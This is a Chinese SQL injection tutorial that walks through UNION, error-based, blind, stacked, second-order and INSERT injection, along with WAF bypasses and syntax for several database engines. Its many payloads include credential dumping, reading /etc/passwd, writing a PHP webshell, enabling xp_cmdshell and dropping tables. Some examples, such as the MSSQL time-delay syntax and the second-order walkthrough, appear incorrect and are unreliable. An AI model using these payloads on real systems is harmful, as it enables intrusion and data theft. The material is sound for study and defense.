# SQL 注入学习笔记

## 目录

1. [基础篇：什么是 SQL 注入](#基础篇什么是-sql-注入)
2. [SQL 注入的成因与原理](#sql-注入的成因与原理)
3. [SQL 注入分类](#sql-注入分类)
4. [MySQL 数据库基础](#mysql-数据库基础)
5. [入门级注入技术](#入门级注入技术)
6. [进阶注入技术](#进阶注入技术)
7. [盲注技术](#盲注技术)
8. [绕过技术](#绕过技术)
9. [二次注入](#二次注入)
10. [不同数据库的注入差异](#不同数据库的注入差异)
11. [INSERT/UPDATE/DELETE 注入（非查询语句注入）](#insertupdatedelete-注入非查询语句注入)
    - 11.1 [INSERT 注入](#0x18-insert-注入)
    - 11.2 [UPDATE 注入](#0x19-update-注入)
    - 11.3 [DELETE 注入](#0x20-delete-注入)
    - 11.4 [ORDER BY / GROUP BY 注入](#0x21-order-by--group-by-注入)
    - 11.5 [LIMIT 注入](#0x22-limit-注入)
    - 11.6 [非查询注入总结](#0x23-非查询注入总结)
12. [SQL 注入防御](#sql-注入防御)
13. [实战练习资源](#实战练习资源)
14. [DNSLog 带外注入](#0x11-dnslog-带外注入out-of-band)

---

## 基础篇：什么是 SQL 注入

### 从一个故事开始

想象你是一家银行的柜台。客户来取钱，需要填写一张取款单：

```
取款人：张三
金额：5000 元
```

你把这张单子交给后台系统，系统执行的操作是：

```
从【张三】的账户中取出 【5000】 元
```

现在，来了一个恶意客户，他在取款单上这样写：

```
取款人：张三 -- 从所有人的账户中给我转 10000 元
金额：5000
```

如果你不加任何检查，直接把这张单子交给后台，后台可能就会执行：

```
从【张三 -- 从所有人的账户中给我转 10000 元】的账户中取出 【5000】 元
```

—— 这就出大事了。

**SQL 注入（SQL Injection）** 本质上就是这个故事在 Web 世界中的翻版：应用程序在构建 SQL 语句时，直接把用户输入的内容拼接进了 SQL 语句中，导致恶意用户可以通过输入"特殊的文本"来篡改 SQL 语句的原本意图，从而执行非预期的数据库操作。

### 通俗理解

SQL 注入的核心问题可以总结为一句话：

> **数据被当成了代码执行。**

用户本应只提供"数据"（比如用户名、密码），但由于程序没有正确区分数据和代码的边界，用户提供的"数据"中夹带的"代码"也被一并执行了。

---

## SQL 注入的成因与原理

### 根本原因

SQL 注入漏洞的产生需要满足两个条件：

1. **用户输入被拼接到 SQL 语句中** —— 程序使用字符串拼接或格式化方式构建 SQL，而不是使用参数化查询。
2. **用户输入未被充分过滤或转义** —— 程序没有对用户输入中的特殊字符（如单引号 `'`、注释符 `--` 等）进行处理。

### 一个典型的漏洞示例

假设有一段 PHP 代码如下：

```php
// 危险写法：直接拼接用户输入
$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $sql);
```

正常情况下，用户输入 `admin` 和 `123456`，SQL 语句为：

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '123456'
```

如果攻击者在用户名处输入：`admin' --`，密码随便输入，SQL 语句变为：

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '123456'
```

在 SQL 中，`--` 是注释符，后面的内容会被忽略。所以实际执行的 SQL 是：

```sql
SELECT * FROM users WHERE username = 'admin'
```

这样就绕过了密码验证。

### SQL 语句结构回顾

要理解 SQL 注入，需要先理解 SQL 语句的基本结构：

```sql
-- 查询语句
SELECT 列名 FROM 表名 WHERE 条件;

-- 插入语句
INSERT INTO 表名 (列1, 列2) VALUES (值1, 值2);

-- 更新语句
UPDATE 表名 SET 列1 = 值1 WHERE 条件;

-- 删除语句
DELETE FROM 表名 WHERE 条件;
```

SQL 注入的核心手法就是：**闭合原始语句的上下文，然后注入自己的 SQL 代码**。

理解"闭合"是关键。在 `WHERE username = '$username'` 中，如果 `$username` 的值是 `admin' OR '1'='1`，那么拼接后：

```sql
WHERE username = 'admin' OR '1'='1'
```

这里的逻辑是：我输入了一个单引号 `'` 来**闭合**了原来 SQL 中的左单引号，然后添加了我们自己的条件 `OR '1'='1'`，最后再用一个 `'` 来和 SQL 中剩下的右单引号配对。

---

## SQL 注入分类

SQL 注入从不同维度有多种分类方式：

### 按注入位置分类

| 分类 | 说明 | 常见位置 |
|------|------|----------|
| **GET 注入** | 通过 URL 参数传递注入 payload | `?id=1'` |
| **POST 注入** | 通过表单提交的数据注入 | 登录框、搜索框 |
| **Cookie 注入** | 通过 Cookie 中的参数注入 | `Cookie: user=admin'` |
| **User-Agent 注入** | 通过 HTTP 头部注入 | `User-Agent: Mozilla/5.0'` |
| **Referer 注入** | 通过 Referer 头部注入 | `Referer: http://xxx.com'` |

### 按获取信息的方式分类（最重要）

| 分类 | 子类 | 说明 | 难度 |
|------|------|------|------|
| **In-Band（带内注入）** | UNION 查询注入 | 通过 UNION 关键字合并查询结果 | ⭐ |
| | 报错注入 | 通过数据库错误信息获取数据 | ⭐⭐ |
| **Inferential（盲注）** | 布尔盲注 | 通过页面返回的 True/False 推断数据 | ⭐⭐⭐ |
| | 时间盲注 | 通过页面响应时间推断数据 | ⭐⭐⭐ |
| **Out-of-Band（带外注入）** | DNSLog 注入 | 通过 DNS 请求外传数据 | ⭐⭐⭐⭐ |

---

## MySQL 数据库基础

由于大部分 Web 应用使用 MySQL 数据库，我们先掌握 MySQL 中与 SQL 注入相关的基础知识。

### 常用系统函数

```sql
-- 版本信息
VERSION()            -- 返回 MySQL 版本，如 '8.0.32'
@@VERSION            -- 同上

-- 当前用户
USER()               -- 返回当前连接的用户
CURRENT_USER()       -- 返回当前认证的用户
DATABASE()           -- 返回当前使用的数据库名

-- 字符串操作
LENGTH(str)          -- 返回字符串长度
SUBSTRING(str, pos, len)  -- 截取子串（下标从1开始）
SUBSTR(str, pos, len)     -- 同上
MID(str, pos, len)        -- 同上
ASCII(char)          -- 返回字符的 ASCII 码
ORD(char)            -- 同 ASCII()
CHAR(num)            -- 将 ASCII 码转为字符
CONCAT(str1, str2)   -- 字符串拼接
CONCAT_WS(sep, s1, s2) -- 带分隔符拼接
GROUP_CONCAT(expr)   -- 将组内的值连接成一个字符串

-- 条件判断
IF(cond, true_val, false_val)   -- 条件判断
IFNULL(expr1, expr2)            -- 如果 expr1 为 NULL 则返回 expr2

-- 其他
SLEEP(n)             -- 休眠 n 秒（时间盲注用）
RAND()               -- 返回 0~1 之间的随机数
COUNT(*)             -- 统计行数
LIMIT n,m            -- 从第 n 行开始取 m 行
OFFSET n             -- 跳过 n 行
```

### information_schema 数据库

MySQL 5.0 及以上版本自带 `information_schema` 数据库，它存储了所有其他数据库的元数据。这是 SQL 注入中最重要的系统数据库，通过它可以获取表名、列名等信息。

```sql
-- 查看所有数据库名
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;

-- 查看指定数据库中的所有表名
SELECT TABLE_NAME FROM information_schema.TABLES 
WHERE TABLE_SCHEMA = 'database_name';

-- 查看指定表中的所有列名
SELECT COLUMN_NAME FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA = 'database_name' AND TABLE_NAME = 'table_name';
```

### 常用注释符

```sql
-- 单行注释（注意 -- 后面有空格）
# 单行注释（MySQL 特有）
/* 多行注释 */
```

### 查询语句的执行顺序

理解 SQL 语句的执行顺序有助于我们理解注入 payload 的构造：

```sql
FROM        -- 1. 确定数据来源
WHERE       -- 2. 过滤行
GROUP BY    -- 3. 分组
HAVING      -- 4. 过滤分组
SELECT      -- 5. 选择列
ORDER BY    -- 6. 排序
LIMIT       -- 7. 限制行数
```

---

## 入门级注入技术

### 0x01 判断是否存在注入

#### 第一步：寻找注入点

常见的注入点特征：URL 中有 `?id=1`、`?page=2` 等参数，或者有搜索框、登录框等表单。

#### 第二步：测试注入

最经典的测试方法：**加一个单引号**。

```
原始 URL:    http://example.com/article.php?id=1
测试 URL:    http://example.com/article.php?id=1'
```

- 如果页面返回**数据库错误信息**，大概率存在注入。
- 如果页面**空白或返回异常**但没有错误信息，可能也存在注入（可能是盲注）。
- 如果页面**正常显示**，可能是做了过滤。

#### 第三步：使用逻辑语句验证

```sql
-- 这两个请求应该返回不同的结果
id=1 AND 1=1   -- 返回正常（条件为真）
id=1 AND 1=2   -- 返回异常（条件为假）
```

如果 `1=1` 正常而 `1=2` 异常，说明我们插入的条件语句被执行了，存在 SQL 注入漏洞。

### 0x02 确定字段数（ORDER BY 法）

在 UNION 注入之前，我们需要知道原查询返回了多少个字段。

```sql
id=1 ORDER BY 1   -- 正常
id=1 ORDER BY 2   -- 正常
id=1 ORDER BY 3   -- 正常
id=1 ORDER BY 4   -- 报错，说明只有 3 个字段
```

**原理**：`ORDER BY` 后面跟数字时，表示按第 N 列排序。如果 N 超过了 SELECT 的列数，就会报错。

也可以使用 `GROUP BY` 来测试，效果类似。

### 0x03 确定显示位

```sql
id=-1 UNION SELECT 1,2,3
```

这里使用 `id=-1` 是因为我们想让原查询不返回结果，这样 UNION 的结果才能显示出来。页面中如果显示了数字（如 `2`），说明该位置可以用于显示数据。

> **为什么用负数**：因为 id 通常是自增的正整数，传一个负数或一个不存在的 id 值，原查询就查不到数据，UNION 的结果就会被展示。

### 0x04 UNION 联合查询注入

#### 获取当前数据库名

```sql
id=-1 UNION SELECT 1,DATABASE(),3
```

#### 获取所有数据库名

```sql
id=-1 UNION SELECT 1,GROUP_CONCAT(SCHEMA_NAME),3 
FROM information_schema.SCHEMATA
```

#### 获取指定数据库中的表名

```sql
id=-1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 
FROM information_schema.TABLES 
WHERE TABLE_SCHEMA = '数据库名'
```

注意：数据库名需要用单引号括起来。如果遇到单引号被过滤的情况，可以使用十六进制：

```sql
id=-1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 
FROM information_schema.TABLES 
WHERE TABLE_SCHEMA = 0xE6B58BE8AF95
```

#### 获取指定表中的列名

```sql
id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 
FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA = '数据库名' AND TABLE_NAME = '表名'
```

#### 获取数据

```sql
id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password),3 
FROM 数据库名.表名
```

### 一个完整的 UNION 注入示例

假设目标 URL 为 `http://example.com/article.php?id=1`

**Step 1：判断注入点**

```
http://example.com/article.php?id=1'    -- 页面报错或异常
http://example.com/article.php?id=1 AND 1=1   -- 正常
http://example.com/article.php?id=1 AND 1=2   -- 异常
```

**Step 2：猜字段数**

```
http://example.com/article.php?id=1 ORDER BY 1   -- 正常
http://example.com/article.php?id=1 ORDER BY 2   -- 正常
http://example.com/article.php?id=1 ORDER BY 3   -- 正常
http://example.com/article.php?id=1 ORDER BY 4   -- 报错 → 字段数为 3
```

**Step 3：找显示位**

```
http://example.com/article.php?id=-1 UNION SELECT 1,2,3
```
页面中显示了 `2` 和 `3`，说明这两个位置可以用于显示数据。

**Step 4：获取数据库名**

```
http://example.com/article.php?id=-1 UNION SELECT 1,DATABASE(),3
```
页面显示当前数据库名为 `security`。

**Step 5：获取表名**

```
http://example.com/article.php?id=-1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'
```
返回 `users,posts,comments`。

**Step 6：获取列名**

```
http://example.com/article.php?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'
```
返回 `id,username,password`。

**Step 7：获取数据**

```
http://example.com/article.php?id=-1 UNION SELECT 1,GROUP_CONCAT(username,'~',password),3 FROM security.users
```
返回 `admin~5f4dcc3b5aa765d61d8327deb882cf99`。

---

## 进阶注入技术

### 0x05 报错注入

报错注入的原理是：利用数据库在处理某些函数或语句时产生的错误信息，将数据"带"到错误消息中。即使页面不直接显示查询结果，只要显示了数据库的错误信息，就可以使用报错注入。

**适用场景**：页面不显示查询结果，但显示数据库错误信息。

#### 常用报错注入函数

##### 1. `extractvalue()`（MySQL 5.1.5+）

```sql
id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))
-- 错误信息：XPATH syntax error: '~security'
```

**原理**：`EXTRACTVALUE(xml_doc, xpath_expr)` 用于从 XML 文档中提取值。第二个参数是 XPath 表达式，如果格式不正确，就会报错并显示其中的内容。我们在第二个参数中用 `CONCAT()` 拼接了一个无效的 XPath 前缀（`0x7e` 即 `~`）和查询结果，数据库就会在报错信息中显示查询结果。

##### 2. `updatexml()`（MySQL 5.1.5+）

```sql
id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE())), 1)
-- 错误信息：XPATH syntax error: '~security'
```

**原理**：与 `EXTRACTVALUE` 类似，`UPDATEXML` 的第二个参数也是 XPath 表达式，同样会触发报错。

##### 3. `floor()` + `rand()` + `group by`（经典报错组合）

```sql
id=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT DATABASE()), FLOOR(RAND()*2)) AS x FROM information_schema.TABLES GROUP BY x) AS y)
-- 错误信息：Duplicate entry 'security1' for key 'group_key'
```

**原理**：利用 `RAND()` 在 `GROUP BY` 中的不确定性导致主键冲突，从而在错误信息中显示数据。这个手法比较经典，但在 MySQL 8.0 中效果可能不如前两种稳定。

> ⚠️ **注意**：报错注入一次只能获取有限长度的数据，通常每次只能获取 32~64 个字符。如果需要获取更长的数据，可以使用 `SUBSTRING()` 逐段提取。

### 0x06 堆叠查询注入

堆叠查询指的是在一条语句结束后，紧接着执行另一条语句。在 MySQL 中，多条语句之间用分号 `;` 分隔。

```sql
id=1; DROP TABLE users; --   -- 删除 users 表（危险！）
id=1; SELECT * FROM admin; --   -- 查询其他表
```

**局限性**：
- 不是所有数据库和 API 都支持堆叠查询（如 PHP 的 `mysqli_query()` 默认不支持）。
- 即使支持，大部分场景下我们也无法看到第二条语句的结果。

**实际用途**：
- 执行 INSERT、UPDATE、DELETE 操作
- 创建文件（需要 FILE 权限）：`SELECT '<?php system($_GET[1]);?>' INTO OUTFILE '/var/www/shell.php'`
- 修改管理员密码等

### 0x07 文件操作注入

MySQL 提供了一些文件操作功能，但需要有相应权限（`FILE` 权限）。

#### 读取文件

```sql
id=-1 UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3
```

`LOAD_FILE()` 函数可以读取服务器上的文件，返回文件内容作为字符串。

**条件**：
- 当前用户有 `FILE` 权限
- 文件必须对 MySQL 用户可读
- 文件大小不能超过 `max_allowed_packet`

#### 写入文件

```sql
id=1 INTO OUTFILE '/var/www/html/shell.php' 
LINES TERMINATED BY '<?php system($_GET[1]);?>'
```

**条件**：
- 当前用户有 `FILE` 权限
- MySQL 对目标目录有写入权限
- 目标目录不能被 MySQL 的 `secure_file_priv` 限制

> ⚠️ **安全提醒**：`secure_file_priv` 是 MySQL 的重要安全配置，生产环境中应将其设为空目录或禁用。

---

## 盲注技术

盲注（Blind Injection）是指攻击者无法直接看到查询结果，只能通过页面的**间接反应**（真/假、响应时间等）来推断数据的技术。

### 0x08 布尔盲注

**原理**：利用页面在条件为 True 和 False 时返回结果不同，逐个字符地猜解数据。

**适用场景**：页面不显示数据，但能根据 SQL 条件是否成立返回不同的页面内容（如"存在"与"不存在"、正常页与 404 等）。

#### 判断数据库名长度

```sql
id=1 AND LENGTH(DATABASE()) = 1   -- 如果为假，说明长度不是 1
id=1 AND LENGTH(DATABASE()) = 2   -- 如果为假，继续试
id=1 AND LENGTH(DATABASE()) = 3   -- 如果为假，继续试
...
id=1 AND LENGTH(DATABASE()) = 8   -- 如果是真，说明数据库名长度为 8
```

#### 逐字符猜解数据库名

```sql
-- 猜第 1 个字符
id=1 AND SUBSTRING(DATABASE(), 1, 1) = 'a'  -- 假，继续
id=1 AND SUBSTRING(DATABASE(), 1, 1) = 's'  -- 真！第一个字符是 s

-- 猜第 2 个字符
id=1 AND SUBSTRING(DATABASE(), 2, 1) = 'a'  -- 假
id=1 AND SUBSTRING(DATABASE(), 2, 1) = 'e'  -- 真！第二个字符是 e

-- 以此类推，最终得到 'security'
```

#### 使用 ASCII 码进行猜解

有时候单引号会被过滤，这时可以使用 ASCII 比较：

```sql
-- 猜第 1 个字符的 ASCII 码
id=1 AND ASCII(SUBSTRING(DATABASE(), 1, 1)) > 100  -- 真，说明 ASCII > 100
id=1 AND ASCII(SUBSTRING(DATABASE(), 1, 1)) > 110  -- 假，说明 ASCII ≤ 110
...
id=1 AND ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115  -- 真，ASCII 115 = 's'
```

**用二分法提高效率**：
ASCII 码范围是 0~127（或 0~255）。使用二分法，每次将范围减半，最多只需要 7~8 次请求就能确定一个字符，而不是最多 127 次。

```
第一次：> 64？    是 → 范围缩小到 65~127
第二次：> 96？    是 → 范围缩小到 97~127
第三次：> 112？   否 → 范围缩小到 97~112
第四次：> 104？   是 → 范围缩小到 105~112
第五次：> 108？   是 → 范围缩小到 109~112
第六次：> 110？   是 → 范围缩小到 111~112
第七次：= 112？   否 → = 111？ 是！→ 字符为 'o'
```

#### 猜解表名

```sql
-- 先猜表名的长度
id=1 AND (SELECT LENGTH(TABLE_NAME) FROM information_schema.TABLES 
          WHERE TABLE_SCHEMA = DATABASE() LIMIT 0,1) = 5

-- 再猜表名的每个字符
id=1 AND (SELECT ASCII(SUBSTRING(TABLE_NAME, 1, 1)) FROM information_schema.TABLES 
          WHERE TABLE_SCHEMA = DATABASE() LIMIT 0,1) = 117
```

#### 布尔盲注的缺点

- **速度慢**：需要发送大量请求（每个字符可能需要 7~8 次请求）
- **容易触发防护**：大量相似请求可能被 WAF 或 IDS 检测到

### 0x09 时间盲注

**原理**：当页面没有任何 True/False 的区别时（即无论条件成立与否，页面返回的内容都一样），我们只能通过数据库的**延时行为**来传递信息。

**适用场景**：页面不显示数据，且布尔盲注也无法使用。

#### 核心函数：`IF()` + `SLEEP()`

```sql
id=1 AND IF(LENGTH(DATABASE()) = 8, SLEEP(3), 0)
```

如果数据库名长度为 8，则休眠 3 秒；否则立即返回。通过测量响应时间来判断条件是否成立。

#### 猜解数据库名

```sql
-- 判断第 1 个字符
id=1 AND IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, SLEEP(3), 0)
-- 如果页面 3 秒后才响应，说明第一个字符是 's'（ASCII 115）

-- 判断第 2 个字符
id=1 AND IF(ASCII(SUBSTRING(DATABASE(), 2, 1)) = 101, SLEEP(3), 0)
-- 如果立即响应，说明不是 'e'，继续试
```

#### 使用 CASE WHEN 替代 IF

有些情况下 `IF()` 函数不可用，可以使用 `CASE WHEN`：

```sql
id=1 AND CASE WHEN LENGTH(DATABASE()) = 8 THEN SLEEP(3) ELSE 0 END
```

#### BENCHMARK 函数（IF 被过滤时的替代方案）

```sql
id=1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1)) = 115, BENCHMARK(5000000, MD5('test')), 0)
```

`BENCHMARK(count, expr)` 会重复执行表达式 count 次，消耗大量时间。

#### 时间盲注的注意事项

1. **网络延迟影响**：需要设置一个足够长的延时（通常 3~5 秒），以确保能区分延时是由 SLEEP 还是网络波动引起的。
2. **数据库连接超时**：延时不能太长，否则可能触发数据库超时。
3. **速度极慢**：比布尔盲注还要慢得多，每个字符可能需要 8 次请求，每次请求等待 3~5 秒。

---

## 绕过技术

### 0x10 常见的绕过技巧

在实际渗透测试中，经常会遇到各种 WAF（Web 应用防火墙）或代码层面的过滤。以下是一些常见的绕过思路。

#### 大小写绕过

当过滤规则只针对特定关键字时：

```sql
-- 原始
UNION SELECT
-- 绕过
uNiOn sElEcT
```

#### 双写绕过

当程序将敏感关键字替换为空时（只替换一次）：

```sql
-- 如果程序将 SELECT 替换为空
SELSELECTECT  →  经过替换后剩下的还是 SELECT
```

#### 编码绕过

```sql
-- URL 编码
单引号 ' → %27

-- 十六进制编码（绕过对引号的过滤）
SELECT * FROM users WHERE username = 0x61646D696E

-- Unicode 编码
-- 某些 WAF 可能无法识别 Unicode 编码的 SQL 关键字
```

#### 注释符绕过

在关键字中间插入注释符：

```sql
SEL/**/ECT * FROM/**/users
UN/**/ION SEL/**/ECT 1,2,3
```

#### 等价替换

```sql
-- 空格被过滤时
SELECT/**/DATABASE()   -- 使用注释代替空格
SELECT(DATABASE())     -- 使用括号包裹
SELECT`DATABASE`()     -- 使用反引号

-- = 被过滤时
id=1 AND 1 LIKE 1      -- 使用 LIKE
id=1 AND 1 IN (1)      -- 使用 IN
id=1 AND 1 BETWEEN 0 AND 2  -- 使用 BETWEEN

-- OR / AND 被过滤时
id=1 || 1=1            -- 使用 || 代替 OR
id=1 && 1=1            -- 使用 && 代替 AND

-- 逗号被过滤时（常用于 SUBSTRING、LIMIT）
SUBSTRING(DATABASE() FROM 1 FOR 1)  -- 使用 FROM...FOR 语法
LIMIT 1 OFFSET 0                    -- 使用 OFFSET 代替逗号
```

#### HTTP 参数污染（HPP）

```sql
-- 原始请求
?id=1 UNION SELECT 1,2,3

-- HPP 绕过某些 WAF
?id=1 UNION&id=SELECT 1,2,3
```

当 WAF 只检查第一个 `id` 参数，而后端接收的是最后一个 `id` 参数时，可以绕过检测。

#### HTTP 参数分块传输

对于某些 WAF，可以将请求体分块传输，绕过基于内容长度的检测。

### 0x11 联合查询被过滤

当 `UNION` 和 `SELECT` 都被严格过滤时，可以考虑其他方式：

1. 使用**报错注入**代替 UNION 注入。
2. 使用**盲注**。
3. 使用**堆叠查询**（如果支持）。

---

## 二次注入

### 0x12 什么是二次注入

**二次注入（Second-Order SQL Injection）** 是一种更隐蔽的注入手法。它的特点是：恶意数据被**先存入数据库**，然后在**后续的操作中**被取出并拼接到 SQL 语句中，从而触发注入。

与普通注入的区别：

| 特征 | 普通注入 | 二次注入 |
|------|----------|----------|
| 攻击时机 | 输入时立即触发 | 输入时不触发，后续使用时才触发 |
| 检测难度 | 较容易（输入特殊字符即有反应） | 较难（输入时看似正常） |
| 触发条件 | 单次请求完成攻击 | 需要两次或多次请求 |

### 一个二次注入的经典场景

**场景**：用户注册 + 修改密码

**Step 1：注册恶意用户**

攻击者在用户名处输入 `admin' -- `：

```sql
INSERT INTO users (username, password) VALUES ('admin' -- ', '123456')
```

由于 `-- ` 是注释符，`-- ` 后面的内容被注释掉，实际插入的 username 是 `admin' `。用户名被成功存入数据库。

**Step 2：后续操作触发注入**

当程序修改密码时，如果使用拼接方式构建 SQL：

```php
$username = getUserFromDB($uid);  // 从数据库取出用户名 "admin' "
$newpass = $_POST['newpassword'];
$sql = "UPDATE users SET password = '$newpass' WHERE username = '$username'";
```

拼接后的 SQL：

```sql
UPDATE users SET password = '654321' WHERE username = 'admin' -- '
```

这实际上修改了 `admin` 用户的密码，而不是 `admin' ` 用户的密码。

### 二次注入的防御难点

二次注入的难点在于：**数据入库时很难判断是否恶意**。因为用户输入 `admin' -- ` 本身是一个合法的字符串，它在 INSERT 时不会产生危害。只有在后续被拼接到 SQL 中时才会产生危害。

**防御二次注入的正确姿势**：**始终使用参数化查询**，无论数据来源是用户直接输入还是从数据库中查询出来的。

---

## 不同数据库的注入差异

### 0x13 MySQL 注入

我们已经在前文详细介绍了 MySQL 的注入方法，这里补充一些 MySQL 特有的特性：

```sql
-- 注释风格
#         -- MySQL 特有单行注释
--        -- 标准 SQL 单行注释（注意后面要有空格）
/*!...*/  -- MySQL 特有的条件执行注释

-- 例如：/*!50001 SELECT * FROM users*/  
-- 在 MySQL 5.00.01 及以上版本中会执行该语句

-- 获取数据库信息
SELECT @@basedir;          -- MySQL 安装目录
SELECT @@datadir;          -- 数据存储目录
SELECT @@version_compile_os;  -- 操作系统类型
SELECT @@secure_file_priv; -- 文件导入导出权限限制
```

**MySQL 权限相关**：

```sql
SELECT user, host, file_priv, super_priv FROM mysql.user;
-- file_priv = 'Y' 表示有文件操作权限
```

### 0x14 MSSQL（SQL Server）注入

MSSQL 与 MySQL 在语法上有不少差异：

```sql
-- 获取版本
SELECT @@VERSION;

-- 获取当前数据库
SELECT DB_NAME();

-- 获取所有数据库（需要 sys.databases 视图）
SELECT name FROM master.sys.databases;

-- 获取当前数据库的所有表
SELECT name FROM sysobjects WHERE xtype = 'U';
-- 或
SELECT TABLE_NAME FROM information_schema.TABLES;

-- 获取表的列名
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'table_name');

-- 系统存储过程
EXEC xp_cmdshell 'whoami';    -- 执行系统命令（需要权限）
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 注释符
--    单行注释
/* */ 多行注释

-- 报错注入（MSSQL 特有的方式）
id=1 AND 1=CONVERT(int, (SELECT DB_NAME()))
-- 错误信息：Conversion failed when converting the nvarchar value 'master' to data type int.

-- 时间盲注
id=1 AND IF(1=1, WAITFOR DELAY '0:0:3', 0)
```

### 0x15 Oracle 注入

Oracle 有一些独特的语法特点：

```sql
-- 获取版本
SELECT * FROM v$version;

-- 获取当前数据库名
SELECT name FROM v$database;

-- 获取所有表（dual 是 Oracle 的虚表）
SELECT table_name FROM all_tables;
SELECT table_name FROM user_tables;   -- 当前用户的表
SELECT table_name FROM dba_tables;    -- 所有表（需要权限）

-- 获取列名
SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE_NAME';

-- 需要指定 FROM（Oracle 必须有 FROM 子句）
SELECT 1 FROM dual;   -- dual 是 Oracle 的虚表

-- 字符串拼接（使用 ||）
SELECT 'user:' || username FROM users;

-- 注释符
--    单行注释（注意 -- 后面无空格要求）
/* */ 多行注释

-- 时间盲注
id=1 AND (CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('abc', 3) ELSE 0 END) IS NOT NULL
```

### 0x16 PostgreSQL 注入

```sql
-- 获取版本
SELECT VERSION();

-- 获取当前数据库
SELECT CURRENT_DATABASE();

-- 获取所有数据库
SELECT datname FROM pg_database;

-- 获取当前数据库的所有表
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';

-- 获取列名
SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name';

-- 注释符
--    单行注释
/* */ 多行注释

-- 时间盲注
id=1 AND (CASE WHEN 1=1 THEN PG_SLEEP(3) ELSE 0 END)
```

---

## INSERT/UPDATE/DELETE 注入（非查询语句注入）

### 0x17 概述

前面的注入技术大多围绕 `SELECT` 查询语句展开，但在实际场景中，`INSERT`、`UPDATE`、`DELETE` 等写操作语句同样存在注入风险，且危害往往更大 —— 它们可以直接修改、删除数据库中的数据。

| 语句 | 常见场景 | 危害 |
|------|----------|------|
| **INSERT** | 用户注册、添加文章、提交评论 | 插入恶意数据、越权创建管理员账户 |
| **UPDATE** | 修改密码、更新个人资料、修改文章 | 修改他人密码、篡改数据、权限提升 |
| **DELETE** | 删除评论、删除文章、注销账户 | 批量删除数据、破坏数据库完整性 |

非查询注入与 SELECT 注入的最大区别在于：**攻击者通常无法直接看到查询结果**，因此报错注入和盲注技术在这里尤为重要。

---

### 0x18 INSERT 注入

INSERT 注入发生在将用户输入拼接到 `INSERT` 语句中时。

#### 场景一：用户注册

假设注册功能的代码如下：

```php
$username = $_POST['username'];
$password = md5($_POST['password']);
$sql = "INSERT INTO users (username, password) VALUES ('$username', '$password')";
mysqli_query($conn, $sql);
```

##### 1. 子查询注入（窃取其他数据）

如果攻击者知道表结构，可以通过子查询将其他数据插入到自己可见的字段中：

```sql
-- 攻击者在用户名处输入：
attacker', (SELECT password FROM users WHERE username='admin')) -- 

-- 实际执行的 SQL：
INSERT INTO users (username, password) VALUES ('attacker', (SELECT password FROM users WHERE username='admin')) -- ', 'md5hash')
```

这样，admin 的密码（或其 hash）就被插入到了 attacker 用户的某个字段中，攻击者注册后登录即可看到。

##### 2. 报错注入（INSERT 上下文）

INSERT 语句中同样可以使用报错注入函数来获取数据：

```sql
-- payload 模板
attacker' AND EXTRACTVALUE(1, CONCAT(0x7e, (注入查询))) AND '1'='1

-- 获取当前数据库名
attacker' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND '1'='1

-- 实际执行：
INSERT INTO users (username, password) VALUES ('attacker' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND '1'='1', 'md5hash')
-- 错误信息：XPATH syntax error: '~database_name'
```

> **技巧**：`AND '1'='1` 最后的闭合与开头的 `'` 配对，确保整个 SQL 语法正确。

##### 3. 使用 `UPDATE` 语法（MySQL `ON DUPLICATE KEY`）

MySQL 的 `INSERT ... ON DUPLICATE KEY UPDATE` 提供了额外的注入可能：

```sql
-- 攻击者在用户名处输入：
admin' ON DUPLICATE KEY UPDATE password='hacked' -- 

-- 实际执行的 SQL：
INSERT INTO users (username, password) VALUES ('admin' ON DUPLICATE KEY UPDATE password='hacked' -- ', 'md5hash')
```

如果 `admin` 用户已存在（唯一键冲突），这将把其密码更新为 `hacked`。

##### 4. 多行插入利用

如果程序支持批量插入，可以注入额外的行来创建后门账户：

```sql
-- 攻击者输入：
normal'), ('attacker2', 'attacker2_hash

-- 实际执行：
INSERT INTO users (username, password) VALUES ('normal'), ('attacker2', 'attacker2_hash', 'md5hash')
```

##### 5. INSERT 盲注

当 INSERT 没有直接报错输出时，可以使用时间盲注：

```sql
-- 判断数据库名长度
attacker' OR IF(LENGTH(DATABASE()) = 8, SLEEP(3), 0) OR '

-- 逐字符猜解数据库名
attacker' OR IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, SLEEP(3), 0) OR '
```

也可以利用布尔盲注，通过是否注册成功（如"用户名已存在"则注册失败）来判断条件真伪：

```sql
-- 测试 admin 密码长度是否大于 32
attacker' OR (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password) > 32) OR '
-- 注册成功 = 条件为 False → 长度 ≤ 32
-- 注册失败 = 条件为 True  → 长度 > 32（因为 admin 用户的子查询返回了结果，导致 OR 条件为真）
```

